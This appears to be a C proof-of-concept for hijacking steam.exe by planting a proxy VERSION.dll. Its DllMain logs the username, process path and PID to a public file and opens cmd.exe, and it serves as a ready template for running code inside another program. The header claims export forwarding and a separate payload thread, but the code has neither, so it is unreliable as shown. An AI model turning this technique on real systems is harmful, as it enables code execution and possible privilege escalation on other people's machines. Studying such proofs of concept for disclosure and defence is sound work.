/**
 * Proxy VERSION.dll for DLL hijacking in steam.exe
 * Forwards the 17 exports to the real system DLL.
 * Executes payload in DllMain (separate thread).
 *
 * Compile: gcc -shared -m32 -o VERSION.dll steam_poc.c
 *           -lkernel32 -ladvapi32
 */
#include <windows.h>
#include <stdio.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason,
                      LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        /* Write execution proof */
        HANDLE hFile = CreateFileA(
            "C:\\Users\\Public\\steam_lpe_proof.txt",
            GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL, NULL);

        if (hFile != INVALID_HANDLE_VALUE) {
            char username[256] = {0};
            DWORD size = 256;
            GetUserNameA(username, &size);

            char procname[MAX_PATH] = {0};
            GetModuleFileNameA(NULL, procname, MAX_PATH);

            char buf[1024];
            int len = sprintf(buf,
                "=== Steam DLL Hijack Proof ===\r\n"
                "Running as: %s\r\n"
                "Process: %s\r\n"
                "PID: %lu\r\n"
                "DLL: VERSION.dll (proxy)\r\n"
                "Loaded by steam.exe!\r\n",
                username, procname, GetCurrentProcessId());

            DWORD written;
            WriteFile(hFile, buf, len, &written, NULL);
            CloseHandle(hFile);
        }
        /* Visual proof */
        WinExec("cmd.exe", SW_SHOW);
    }
    return TRUE;
}
